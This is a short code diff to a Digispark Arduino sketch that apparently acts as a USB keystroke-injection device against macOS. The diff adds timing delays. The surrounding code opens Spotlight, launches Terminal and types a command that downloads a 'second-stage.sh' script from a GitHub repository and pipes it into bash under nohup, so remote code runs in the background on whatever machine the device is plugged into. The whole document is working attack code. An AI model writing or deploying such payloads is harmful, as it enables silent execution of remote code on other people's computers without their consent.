@@ -2,8 +2,11 @@
 
 void setup()
 {
+  delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
+  delay(500);
   DigiKeyboard.print("terminal");
+  delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   delay(2000);
   DigiKeyboard.print("curl https://raw.githubusercontent.com/gianluca-venturini/papera/master/second-stage.sh | nohup /bin/bash");
